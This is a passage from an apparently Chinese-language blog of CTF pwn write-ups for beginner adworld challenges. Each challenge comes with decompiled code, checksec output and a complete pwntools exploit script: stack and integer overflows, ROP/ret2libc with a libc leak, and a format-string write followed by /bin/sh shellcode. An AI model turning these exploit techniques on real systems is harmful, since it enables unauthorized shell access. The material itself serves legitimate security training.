[rsp+8h] [rbp-18h]</span></span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"What's Your Birth?\"</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;v5);</span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"What's Your Name?\"</span>);</span><br><span class=\"line\">    gets(&amp;v4);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"You Are Born In %d\\n\"</span>, v5);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v5 == <span class=\"number\">1926</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">\"You Shall Have Flag.\"</span>);</span><br><span class=\"line\">      system(<span class=\"string\">\"cat flag\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./when_did_you_born\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31452</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"What's Your Birth?\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"123\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"What's Your Name?\\n\"</span>)</span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span> * <span class=\"number\">8</span> + <span class=\"string\">\"\\x86\\x07\"</span></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"hello-pwn\"><a href=\"#hello-pwn\" class=\"headerlink\" title=\"hello_pwn\"></a>hello_pwn</h2><p>该题跟上一题类似，也是溢出，不过是溢出全局变量。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __<span class=\"function\">fastcall <span class=\"title\">main</span><span class=\"params\">(__int64 a1, <span class=\"keyword\">char</span> **a2, <span class=\"keyword\">char</span> **a3)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  alarm(<span class=\"number\">0x3C</span>u);</span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"~~ welcome to ctf ~~     \"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"lets get helloworld for bof\"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;unk_601068, <span class=\"number\">0x10</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( dword_60106C == <span class=\"number\">1853186401</span> )</span><br><span class=\"line\">    sub_400686();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0L</span>L;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./hello_pwn\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31454</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"lets get helloworld for bof\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span> * <span class=\"number\">4</span> + <span class=\"string\">\"\\x61\\x61\\x75\\x6e\"</span></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"level0\"><a href=\"#level0\" class=\"headerlink\" title=\"level0\"></a>level0</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/adworld/level0_$ checksec level0 </span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/adworld/level0_/level0&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    No RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<p>同样是栈溢出，同时开启了NX，但是已经布置好system(“/bin/sh”)的函数，直接覆盖eip为0x400596即可。偏移为0x80。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0000000000400596                 public callsystem</span><br><span class=\"line\">.text:0000000000400596 callsystem      proc near</span><br><span class=\"line\">.text:0000000000400596 ; __unwind &#123;</span><br><span class=\"line\">.text:0000000000400596                 push    rbp</span><br><span class=\"line\">.text:0000000000400597                 mov     rbp, rsp</span><br><span class=\"line\">.text:000000000040059A                 mov     edi, offset command ; &quot;/bin/sh&quot;</span><br><span class=\"line\">.text:000000000040059F                 call    _system</span><br><span class=\"line\">.text:00000000004005A4                 pop     rbp</span><br><span class=\"line\">.text:00000000004005A5                 retn</span><br></pre></td></tr></table></figure>\n<p>注意rip后不要再跟多余的padding，否则等callsystem函数返回之后会报错。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./level0\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31457</span>)</span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span> * <span class=\"number\">0x88</span> + p64(<span class=\"number\">0x400596</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Hello, World\\n\"</span>)</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"level2\"><a href=\"#level2\" class=\"headerlink\" title=\"level2\"></a>level2</h2><p>根据提示可知该题是用ROP，即ret2libc。由于没有开启pie和canary，程序也直接调用了system函数，所以很简单，不需要leak libc基地址。用IDA可以找到/bin/sh字符串，然后用栈传参即可。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.data:0804A024 hint            db &apos;/bin/sh&apos;,0</span><br></pre></td></tr></table></figure>\n<p>注意调整栈平衡</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./level2\"</span>)</span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./level2\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31463</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Input:\\n\"</span>)</span><br><span class=\"line\">offset = <span class=\"number\">0x88</span> + <span class=\"number\">4</span></span><br><span class=\"line\">rop = offset * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(elf.plt[<span class=\"string\">'system'</span>])</span><br><span class=\"line\">rop += <span class=\"string\">\"aaaa\"</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">0x804a024</span>)</span><br><span class=\"line\">p.send(rop)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"string\"><a href=\"#string\" class=\"headerlink\" title=\"string\"></a>string</h2><p>该题开启了canary和nx。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/adworld/string$ checksec string </span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/adworld/string/string&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<p>程序大意是类似一个MUD游戏，输入名字，输入east、up等用命令行与游戏交互，控制主角的行动。</p>\n<p>main函数中会首先malloc一个chunk，然后会leak出chunk的地址（即堆中D和U字符的地址）</p>\n<p>在sub_0x400bb9函数中存在格式化字符串漏洞</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">unsigned</span> __<span class=\"function\">int64 <span class=\"title\">sub_400BB9</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  ...</span><br><span class=\"line\">  _isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;v1);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 == <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"A voice heard in your mind\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"'Give me an address'\"</span>);</span><br><span class=\"line\">    _isoc99_scanf(<span class=\"string\">\"%ld\"</span>, &amp;v2);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"And, you wish is:\"</span>);</span><br><span class=\"line\">    _isoc99_scanf(<span class=\"string\">\"%s\"</span>, &amp;format);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Your wish is\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(&amp;format, &amp;format);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"I hear it, I hear it....\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v4;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>而在最后的sub_0x400ca6函数中，如果之前的D和U两个字符相同，就会直接劫持控制流。此时只需要将shellcode布置到这块堆空间就可以了。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( *chunk == chunk[<span class=\"number\">1</span>] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Wizard: I will help you! USE YOU SPELL\"</span>);</span><br><span class=\"line\">    v1 = mmap(<span class=\"number\">0L</span>L, <span class=\"number\">0x1000</span>uLL, <span class=\"number\">7</span>, <span class=\"number\">33</span>, <span class=\"number\">-1</span>, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">    read(<span class=\"number\">0</span>, v1, <span class=\"number\">0x100</span>uLL);</span><br><span class=\"line\">    ((<span class=\"keyword\">void</span> (__fastcall *)(_QWORD, <span class=\"keyword\">void</span> *))v1)(<span class=\"number\">0L</span>L, v1);</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<p>所以利用思路是：通过fs漏洞修改已知地址的D和U两个字符为相同值，然后直接读入shellcode。由于程序首先要求我们输入address，可以将要修改的地址先读入栈中，然后利用v2在栈中的相对偏移写入。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">context.arch = <span class=\"string\">'amd64'</span></span><br><span class=\"line\">shellcode = <span class=\"string\">\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"</span></span><br><span class=\"line\"><span class=\"comment\"># elf = ELF(\"./string\")</span></span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./string\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31504</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"we will tell you two secret ...\\n\"</span>)</span><br><span class=\"line\">addr1 = int(<span class=\"string\">\"0x\"</span> + p.recvline().split(<span class=\"string\">\" \"</span>)[<span class=\"number\">-1</span>], <span class=\"number\">16</span>)</span><br><span class=\"line\">addr2 = int(<span class=\"string\">\"0x\"</span> + p.recvline().split(<span class=\"string\">\" \"</span>)[<span class=\"number\">-1</span>], <span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(addr1),hex(addr2)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"What should your character's name be:\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"liwc\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"So, where you will go?east or up?:\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"east\"</span>)</span><br><span class=\"line\">offset = <span class=\"number\">7</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"go into there(1), or leave(0)?:\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"'Give me an address'\\n\"</span>)</span><br><span class=\"line\">p.sendline(str(addr1))</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"And, you wish is:\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">\"%085d%7$n\"</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(shellcode)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"guess-num\"><a href=\"#guess-num\" class=\"headerlink\" title=\"guess_num\"></a>guess_num</h2><p>该题也是栈溢出漏洞的利用，只需要覆盖掉srand函数的随机种子，然后就可以预测出rand()的序列，得到shell。</p>\n<p>预测序列的C程序如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">  srand(<span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt;= <span class=\"number\">9</span>;++i) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> num = rand() % <span class=\"number\">6</span> + <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d \"</span>, num);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>相应的exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">context.arch = <span class=\"string\">'amd64'</span></span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./guess_num\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31574</span>)</span><br><span class=\"line\">numbers = [<span class=\"number\">2</span>,<span class=\"number\">5</span>,<span class=\"number\">4</span>,<span class=\"number\">2</span>,<span class=\"number\">6</span>,<span class=\"number\">2</span>,<span class=\"number\">5</span>,<span class=\"number\">1</span>,<span class=\"number\">4</span>,<span class=\"number\">2</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span> * <span class=\"number\">0x20</span> + p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"name:\"</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">10</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Please input your guess number:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(numbers[i]))</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"int-overflow\"><a href=\"#int-overflow\" class=\"headerlink\" title=\"int_overflow\"></a>int_overflow</h2><p>该题开启了NX，没有开启PIE和canary。</p>\n<p>通过整数溢出漏洞溢出v3，过掉输入长度的校验（在3到8之间），顺便修改返回地址。</p>\n<p>exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">p = process(<span class=\"string\">\"./int_overflow\"</span>)</span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31580</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">magic = <span class=\"number\">0x0804868B</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Your choice:\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Please input your username:\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"liwc\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"passwd:\\n\"</span>)</span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(p)</span></span><br><span class=\"line\">p.send(<span class=\"number\">0x18</span> * <span class=\"string\">\"a\"</span> + p32(magic) + (<span class=\"number\">262</span> - <span class=\"number\">0x18</span> - <span class=\"number\">4</span>) * <span class=\"string\">\"b\"</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"cgpwn2\"><a href=\"#cgpwn2\" class=\"headerlink\" title=\"cgpwn2\"></a>cgpwn2</h2><p>该题是一个常规的栈溢出，构造很短的rop链即可。这里我使用了一条call system指令配合输入到bss段的/bin/sh字符串实现。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0804855A                 call    _system</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">p = process(<span class=\"string\">\"./cgpwn2\"</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./cgpwn2\"</span>)</span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31688</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"name\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"/bin/sh\\x00\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"here:\\n\"</span>)</span><br><span class=\"line\">payload = (<span class=\"number\">0x26</span> + <span class=\"number\">4</span>) * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">payload += p32(<span class=\"number\">0x804855a</span>)</span><br><span class=\"line\">payload += p32(<span class=\"number\">0x0804A080</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"level3\"><a href=\"#level3\" class=\"headerlink\" title=\"level3\"></a>level3</h2><p>该题理论上是新手入坑中最难的一题，因为题目没有提供libc文件，并且system不是程序的导入函数，所以必须手动leak libc。注意由于一次溢出劫持控制流并不能完成利用，所以需要在leak libc之后返回到vulnerable function，再次溢出执行system(“/bin/sh”)。这里使用了LibcSearcher（<a href=\"https://github.com/lieanu/LibcSearcher\" target=\"_blank\" rel=\"noopener\">repo地址</a>）。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./level3\"</span>)</span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span> ,<span class=\"number\">31718</span>)</span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./level3\")</span></span><br><span class=\"line\"></span><br><span class=\"line\">offset = <span class=\"number\">0x88</span> + <span class=\"number\">4</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Input:\\n\"</span>)</span><br><span class=\"line\">rop = offset * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(elf.plt[<span class=\"string\">'write'</span>])</span><br><span class=\"line\">rop += p32(<span class=\"number\">0x804844b</span>)</span><br><span class=\"line\">rop += p32(<span class=\"number\">1</span>) + p32(elf.got[<span class=\"string\">'__libc_start_main'</span>]) + p32(<span class=\"number\">4</span>)</span><br><span class=\"line\">p.sendline(rop)</span><br><span class=\"line\">addr = u32(p.recvuntil(<span class=\"string\">\"\\xf7\"</span>)[<span class=\"number\">-4</span>:])</span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(addr)</span><br><span class=\"line\"></span><br><span class=\"line\">obj = LibcSearcher(<span class=\"string\">'__libc_start_main'</span>, addr)</span><br><span class=\"line\">libc_base = addr - obj.dump(<span class=\"string\">\"__libc_start_main\"</span>)</span><br><span class=\"line\">system = libc_base + obj.dump(<span class=\"string\">\"system\"</span>)</span><br><span class=\"line\">binsh = libc_base + obj.dump(<span class=\"string\">\"str_bin_sh\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Input:\\n\"</span>)</span><br><span class=\"line\">rop = offset * <span 